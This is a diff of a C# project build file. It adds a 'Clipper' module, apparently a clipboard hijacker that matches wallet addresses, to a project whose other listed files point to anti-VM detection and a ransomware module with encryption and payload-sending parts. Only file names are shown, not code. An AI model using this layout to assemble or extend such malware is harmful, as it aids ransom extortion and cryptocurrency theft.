@@ -64,6 +64,10 @@
     <Compile Include="Components\AntiVM\Detector.cs" />
     <Compile Include="Components\Utilities\Common.cs" />
     <Compile Include="Components\Utilities\Syscalls.cs" />
+    <Compile Include="Modules\Clipper\Clipboard.cs" />
+    <Compile Include="Modules\Clipper\Clipper.cs" />
+    <Compile Include="Modules\Clipper\RegexAddress.cs" />
+    <Compile Include="Modules\Clipper\Settings.cs" />
     <Compile Include="Modules\Ransomware\Components\Algorithms\Aes256.cs" />
     <Compile Include="Modules\Ransomware\Components\Postman\PayloadGen.cs" />
     <Compile Include="Modules\Ransomware\Components\Postman\Sender.cs" />
